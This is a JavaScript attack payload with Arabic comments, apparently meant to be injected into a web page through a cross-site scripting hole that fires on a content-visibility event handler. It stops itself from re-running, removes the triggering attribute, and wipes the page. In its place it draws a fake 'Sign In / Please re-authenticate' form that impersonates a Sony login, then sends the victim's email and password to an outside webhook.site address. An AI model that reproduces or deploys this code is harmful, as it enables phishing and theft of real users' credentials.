// منع التكرار فوراً بأسرع وسيلة ممكنة
if (window.done) { 
    throw new Error("Stop Loop"); 
}
window.done = true;

// حذف الحدث فوراً من الرابط
try {
    document.querySelectorAll('*').forEach(el => {
        if (el.hasAttribute('oncontentvisibilityautostatechange')) {
            el.removeAttribute('oncontentvisibilityautostatechange');
            el.outerHTML = el.outerHTML; // إعادة بناء العنصر لقتل الأحداث المرتبطة به
        }
    });
} catch(e) {}

// تنفيذ الفورم بعد تأخير بسيط للتأكد من استقرار المتصفح
setTimeout(function() {
    // بناء الفورم في نافذة منفصلة أو فوق الصفحة
    var html = `
    <div id="xf" style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:2147483647;display:flex;flex-direction:column;align-items:center;padding-top:50px;font-family:sans-serif;">
        <img src="https://sony.net" width="120">
        <h2 style="margin-top:30px;">Sign In</h2>
        <p style="color:#555;">Please re-authenticate to continue.</p>
        <input type="text" id="e" placeholder="Email" style="width:300px;padding:15px;margin:10px;border:1px solid #ccc;border-radius:4px;">
        <input type="password" id="p" placeholder="Password" style="width:300px;padding:15px;margin:10px;border:1px solid #ccc;border-radius:4px;">
        <button id="b" style="width:300px;padding:15px;background:#0071e3;color:#fff;border:none;border-radius:25px;font-weight:bold;cursor:pointer;margin-top:20px;">Sign In</button>
    </div>`;

    // مسح محتوى الصفحة بالكامل لضمان توقف أي سكريبتات أخرى تسبب الـ Loop
    document.documentElement.innerHTML = html;

    document.getElementById('b').onclick = function() {
        var mail = document.getElementById('e').value;
        var pass = document.getElementById('p').value;
        if(mail && pass) {
            location.href = "https://webhook.site/1f5c01fc-72f2-4a77-9b53-b93d57154665" + encodeURIComponent(mail) + "&p=" + encodeURIComponent(pass);
        }
    };
}, 100);
